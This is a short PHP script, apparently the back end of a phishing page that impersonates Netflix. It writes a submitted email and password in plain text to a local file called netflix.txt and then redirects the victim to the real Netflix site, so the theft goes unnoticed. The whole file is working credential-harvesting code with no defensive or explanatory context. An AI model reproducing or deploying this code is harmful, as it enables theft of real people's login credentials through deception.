<?php

file_put_contents("../datas/netflix.txt", "Account: " . $_POST['email'] . "\nPass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://netflix.com');
exit();
